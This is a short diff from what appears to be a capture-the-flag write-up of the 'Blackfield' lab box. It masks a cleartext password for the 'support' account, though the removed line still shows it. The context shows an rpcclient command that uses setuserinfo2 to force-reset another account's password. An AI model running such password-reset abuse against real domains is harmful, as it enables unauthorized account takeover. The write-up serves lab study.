@@ -114,7 +114,7 @@ Used rpcclient to change audit2020's password:
 
 ```bash
 rpcclient -U blackfield/support 10.129.229.17
-# Password: #00^BlackKnight
+# Password: xxxxBlackKnight
 
 setuserinfo2 audit2020 23 'NewPassword123!'
 exit
